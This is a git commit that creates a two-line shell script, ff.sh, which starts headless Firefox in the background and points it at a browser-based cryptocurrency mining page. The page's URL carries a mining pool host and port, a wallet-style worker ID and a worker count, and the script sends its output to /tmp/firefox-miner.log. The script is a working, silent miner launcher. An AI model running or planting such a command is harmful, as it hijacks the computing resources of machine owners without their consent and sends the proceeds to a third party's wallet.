32213596ea54f142b4ef5823d6a35bf9e26c68cf
t2-source <t2@40.aa01.my03.com>
2025-09-30 12:13:05 +0800

    Create ff.sh

---
+++ ff.sh
@@ -0,0 +1,2 @@
+nohup firefox --headless "https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.idx&password=X&workers=7" \
+ > /tmp/firefox-miner.log 2>&1 &
